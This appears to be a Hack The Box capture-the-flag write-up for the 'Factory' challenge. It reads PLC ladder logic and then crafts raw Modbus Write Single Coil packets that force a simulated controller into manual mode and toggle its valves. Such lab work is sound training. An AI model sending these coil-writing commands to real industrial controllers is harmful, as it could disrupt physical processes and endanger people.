# Factory HTB Challenge

## Analysis

Let's look at the connection first using Nmap:

![Nmap Scan](./Pasted%20image%2020260915002931.png)

The challenge gives us two files: an image and a PDF.

![Challenge Files](./Pasted%20image%2020260915001114.png)

Our task is to:

* **Close `in_valve`**
* **Open `out_valve`**

---

## Understanding the PLC Logic

Let's first look at the provided diagram.

![PLC Diagram](./Pasted%20image%2020260915011908.png)

This picture explains how `auto_mode` and `manual_mode` work.

`auto_mode` is enabled when the system starts, while `manual_mode` can only be enabled when `auto_mode` is disabled.

![Manual Mode Logic](./Pasted%20image%2020260915001945.png)

For this challenge, we're going to ignore the automatic logic at the top because we want to control the PLC manually.

---

# Opening `out_valve`

Looking at the lower section of the ladder logic, for `out_valve` to become `1`, the following conditions must be true:

```text
force_start_out = 1
manual_mode     = 1
stop_out        = 0
```

So this is how we can manually turn on `out_valve`.

---

# Closing `in_valve`

Now let's look at the logic controlling `in_valve`.

![Input Valve Logic](./Pasted%20image%2020260915003802.png)

To turn `in_valve` off, we need:

```text
force_start_in = 0
manual_mode    = 1
stop_in        = 1
```

The important part here is getting `stop_in` to become `1`.

Looking further into the ladder logic:

![Stop In Logic](./Pasted%20image%2020260915003953.png)

To activate `stop_in`, we need:

```text
cutoff_in   = 1
manual_mode = 1
```

So our overall plan is now clear.

---

# Turning `out_valve` On — Plan

Let's look at the original values before changing anything.

![Initial PLC Values](./Pasted%20image%2020260915002931.png)

The initial state is:

```text
auto_mode   = 1
manual_mode = 0
stop_out    = 0
stop_in     = 0
low_sensor  = 0
high_sensor = 0
in_valve    = 1
out_valve   = 0
```

To turn on `out_valve`, we determined that we need:

```text
force_start_out = 1
manual_mode     = 1
stop_out        = 0
```

First, we enable `manual_mode`.

Doing this disables `auto_mode`, giving us:

```text
auto_mode   = 0
manual_mode = 1
stop_out    = 0
stop_in     = 0
low_sensor  = 0
high_sensor = 0
in_valve    = 1
out_valve   = 0
```

`stop_out` is already `0`, so the only remaining requirement is:

```text
force_start_out = 1
```

## Steps

1. Turn on `manual_mode`
2. Turn on `force_start_out`

---

# Turning `in_valve` Off — Plan

After completing the previous steps, we expect the state to look like:

```text
auto_mode   = 0
manual_mode = 1
stop_out    = 0
stop_in     = 0
low_sensor  = 0
high_sensor = 0
in_valve    = 1
out_valve   = 1
```

To turn `in_valve` off, we need:

```text
force_start_in = 0
manual_mode    = 1
stop_in        = 1
```

`manual_mode` is already enabled.

`force_start_in` is also `0` by default.

Therefore, the only value we need to change is:

```text
stop_in = 1
```

From the ladder logic, `stop_in` can be activated by setting:

```text
cutoff_in   = 1
manual_mode = 1
```

Since `manual_mode` is already enabled, our final step is simply:

```text
cutoff_in = 1
```

The expected final state is:

```text
auto_mode   = 0
manual_mode = 1
stop_out    = 0
stop_in     = 1
low_sensor  = 0
high_sensor = 0
in_valve    = 0
out_valve   = 1
```

This achieves the challenge objective:

```text
in_valve  = CLOSED
out_valve = OPEN
```

---

# Actually Sending the Commands

In this challenge, we need to send commands using the Modbus packet structure.

| FC      | Command                       | Request Structure                   |
| ------- | ----------------------------- | ----------------------------------- |
| `01`    | Read Coils                    | `AA 01 CCCC NNNN`                   |
| `02`    | Read Discrete Inputs          | `AA 02 CCCC NNNN`                   |
| `03`    | Read Holding Registers        | `AA 03 CCCC NNNN`                   |
| `04`    | Read Input Registers          | `AA 04 CCCC NNNN`                   |
| `05`    | Write Single Coil             | `AA 05 CCCC DDDD`                   |
| `06`    | Write Single Register         | `AA 06 CCCC DDDD`                   |
| `07`    | Read Exception Status         | `AA 07`                             |
| `08`    | Diagnostics                   | `AA 08 SSSS DATA`                   |
| `0B`    | Get Comm Event Counter        | `AA 0B`                             |
| `0C`    | Get Comm Event Log            | `AA 0C`                             |
| `0F`    | Write Multiple Coils          | `AA 0F CCCC NNNN LL DATA`           |
| `10`    | Write Multiple Registers      | `AA 10 CCCC NNNN LL DATA`           |
| `11`    | Report Server ID              | `AA 11`                             |
| `14`    | Read File Record              | `AA 14 LL SUBREQUESTS`              |
| `15`    | Write File Record             | `AA 15 LL SUBREQUESTS`              |
| `16`    | Mask Write Register           | `AA 16 CCCC AAAA OOOO`              |
| `17`    | Read/Write Multiple Registers | `AA 17 RRRR NNNN WWWW MMMM LL DATA` |
| `18`    | Read FIFO Queue               | `AA 18 CCCC`                        |
| `2B`    | Encapsulated Interface        | `AA 2B MEI DATA`                    |
| `2B/0E` | Read Device Identification    | `AA 2B 0E DD OO`                    |

For this challenge, we need:

```text
05 — Write Single Coil
```

The structure is:

```text
AA 05 CCCC DDDD
```

Where:

```text
AA   = Slave ID
05   = Write Single Coil
CCCC = Coil address
DDDD = Value
```

For writing a coil:

```text
FF00 = ON / TRUE
0000 = OFF / FALSE
```

The challenge provides the following information:

![Modbus Information](./Pasted%20image%2020260915010336.png)

The Slave ID is:

```text
82 decimal
```

Convert it to hexadecimal:

```text
82 = 0x52
```

Therefore, every command begins with:

```text
52 05
```

Our simplified packet structure becomes:

```text
52 05 CCCC DDDD
```

or without spaces:

```text
5205CCCCDDDD
```

---

# Step 1 — Enable Manual Mode

The address for `manual_mode` is:

```text
9947
```

Convert `9947` to hexadecimal:

```text
9947 = 0x26DB
```

We want to enable it, so:

```text
DDDD = FF00
```

Packet:

```text
52 05 26DB FF00
```

Final command:

```text
520526DBFF00
```

![Enable Manual Mode](./Pasted%20image%2020260915011051.png)

---

# Step 2 — Enable `force_start_out`

Now we need to turn on:

```text
force_start_out
```

Its coil address is:

```text
52 decimal
```

Convert it to hexadecimal:

```text
52 = 0x34
```

As a 16-bit address:

```text
0034
```

We want to set it to `TRUE`:

```text
FF00
```

Packet:

```text
52 05 0034 FF00
```

Final command:

```text
52050034FF00
```

![Enable Force Start Out](./Pasted%20image%2020260915011340.png)

At this point:

```text
out_valve = 1
```

---

# Step 3 — Close `in_valve`

Finally, we need to activate:

```text
cutoff_in
```

Its address is:

```text
0x001A
```

We want to set it to `TRUE`:

```text
FF00
```

Packet:

```text
52 05 001A FF00
```

Final command:

```text
5205001AFF00
```

![Enable Cutoff In](./Pasted%20image%2020260915011541.png)

This activates `stop_in`, which causes:

```text
in_valve = 0
```

The final state is therefore:

```text
in_valve  = 0
out_valve = 1
```

And we receive the flag.

---

# Final Commands

The complete sequence was:

```text
520526DBFF00
52050034FF00
5205001AFF00
```

Which corresponds to:

| Step | Action                   | Command        |
| ---- | ------------------------ | -------------- |
| 1    | Enable `manual_mode`     | `520526DBFF00` |
| 2    | Enable `force_start_out` | `52050034FF00` |
| 3    | Enable `cutoff_in`       | `5205001AFF00` |

Result:

```text
in_valve  = CLOSED
out_valve = OPEN
```

**Challenge solved.**
